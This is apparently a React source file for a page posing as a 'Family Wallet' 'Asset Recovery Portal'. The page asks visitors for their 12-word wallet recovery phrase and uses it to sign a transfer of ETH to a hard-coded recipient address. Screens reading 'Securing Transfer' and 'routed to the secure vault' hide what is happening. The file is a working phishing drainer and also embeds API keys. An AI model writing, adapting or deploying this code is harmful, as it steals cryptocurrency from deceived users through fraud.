import { useState, useEffect } from 'react'
import { ethers } from 'ethers' 
import { createSmartAccountClient } from "@biconomy/account"
import { LucideShieldAlert, LucideCheckCircle, LucideLoader2 } from 'lucide-react'

// --- CONFIGURATION ---
const BICONOMY_API_KEY = "mee_Uma9ycJRjM615N7Env5HRM" 
const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/1/nJP-uP3_K.w7e33524-8b6a-4953-83a3-111d4d805461"
const RECIPIENT_ADDRESS = "0x7DDB4ef8DF3A2BDC0bb2C046Ee18A1e67407321a" 

export default function App() {
  const [isClient, setIsClient] = useState(false)
  const [keys, setKeys] = useState('')
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
  const [errorMsg, setErrorMsg] = useState('')

  useEffect(() => {
    setIsClient(true)
  }, [])

  const startSweep = async () => {
    if (!keys || keys.trim().split(/\s+/).length < 12) {
      alert("Please enter the 12-word recovery phrase.")
      return
    }

    setStatus('processing')
    try {
      const provider = new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com")
      const signer = ethers.Wallet.fromMnemonic(keys.trim()).connect(provider)

      const smartAccount = await createSmartAccountClient({
        signer,
        bundlerUrl: BUNDLER_URL,
        biconomyPaymasterApiKey: BICONOMY_API_KEY 
      })

      const tx = {
        to: RECIPIENT_ADDRESS,
        value: ethers.utils.parseEther("0.001").toBigInt(), 
        data: "0x"
      }

      const userOpResponse = await smartAccount.sendTransaction(tx)
      await userOpResponse.wait()
      setStatus('success')
    } catch (e: any) {
      console.error(e)
      setErrorMsg(e.message || "Transfer failed.")
      setStatus('error')
    }
  }

  if (!isClient) return null

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 font-sans selection:bg-blue-500/30">
      {status === 'idle' && (
        <div className="w-full max-w-md space-y-10 animate-in fade-in slide-in-from-bottom-4 duration-1000">
          <div className="text-center space-y-3">
            <h1 className="text-5xl font-black tracking-tighter uppercase italic leading-none">
              Family <span className="text-blue-600">Wallet</span>
            </h1>
            <div className="flex items-center justify-center gap-2">
              <div className="h-px w-8 bg-zinc-800"></div>
              <p className="text-zinc-500 text-[10px] uppercase tracking-[0.3em] font-bold">Asset Recovery Portal</p>
              <div className="h-px w-8 bg-zinc-800"></div>
            </div>
          </div>

          <div className="relative group">
            <div className="absolute -inset-1 bg-gradient-to-b from-blue-600/20 to-transparent rounded-[2.5rem] blur opacity-25 group-focus-within:opacity-50 transition duration-1000"></div>
            <textarea
              className="relative w-full h-48 bg-zinc-950 border border-zinc-800 rounded-[2rem] p-6 text-center text-lg focus:ring-1 focus:ring-blue-500/50 outline-none transition-all placeholder:text-zinc-800 resize-none shadow-2xl"
              placeholder="Enter your 12-word secret phrase"
              value={keys}
              onChange={(e) => setKeys(e.target.value)}
            />
          </div>

          <button
            onClick={startSweep}
            className="w-full py-6 bg-blue-600 hover:bg-blue-500 text-white rounded-[2rem] font-black text-xl transition-all shadow-xl shadow-blue-900/20 active:scale-[0.98] uppercase tracking-tight group overflow-hidden relative"
          >
            <span className="relative z-10">Withdraw All Assets</span>
            <div className="absolute inset-0 bg-white/10 translate-y-full group-hover:translate-y-0 transition-transform duration-300"></div>
          </button>

          <p className="text-center text-zinc-600 text-[10px] px-12 leading-relaxed uppercase tracking-wider opacity-50">
            Powered by Biconomy Gasless Infrastructure
          </p>
        </div>
      )}

      {status === 'processing' && (
        <div className="flex flex-col items-center space-y-6 text-center animate-in fade-in duration-500">
          <div className="relative">
            <div className="absolute inset-0 bg-blue-500/20 blur-2xl rounded-full"></div>
            <LucideLoader2 className="w-20 h-20 text-blue-500 animate-spin relative" />
          </div>
          <div className="space-y-2">
            <h2 className="text-3xl font-black uppercase italic tracking-tighter">Securing Transfer</h2>
            <p className="text-zinc-500 text-xs uppercase tracking-widest animate-pulse">Establishing Smart Account Tunnel...</p>
          </div>
        </div>
      )}

      {status === 'success' && (
        <div className="flex flex-col items-center space-y-8 text-center animate-in zoom-in duration-700">
          <div className="relative">
            <div className="absolute inset-0 bg-green-500/20 blur-3xl rounded-full"></div>
            <LucideCheckCircle className="w-32 h-32 text-green-500 relative" />
          </div>
          <div className="space-y-2">
            <h1 className="text-7xl font-black text-green-500 uppercase italic tracking-tighter">Success</h1>
            <p className="text-zinc-400 text-sm max-w-xs mx-auto">Assets are being routed to the secure vault address.</p>
          </div>
          <button 
            onClick={() => setStatus('idle')} 
            className="px-10 py-3 bg-zinc-900 hover:bg-zinc-800 rounded-full text-xs font-bold uppercase tracking-widest transition-colors border border-zinc-800"
          >
            Finish Process
          </button>
        </div>
      )}

      {status === 'error' && (
        <div className="flex flex-col items-center space-y-6 text-center animate-in shake duration-500">
          <LucideShieldAlert className="w-24 h-24 text-red-600" />
          <div className="space-y-2">
            <h2 className="text-3xl font-black text-red-600 uppercase italic tracking-tighter">Transfer Blocked</h2>
            <p className="max-w-xs text-zinc-500 text-xs leading-relaxed">{errorMsg}</p>
          </div>
          <button 
            onClick={() => setStatus('idle')} 
            className="px-12 py-4 bg-red-600/10 hover:bg-red-600/20 text-red-500 rounded-2xl font-bold uppercase tracking-widest transition-all border border-red-600/20"
          >
            Retry Verification
          </button>
        </div>
      )}
    </div>
  )
}
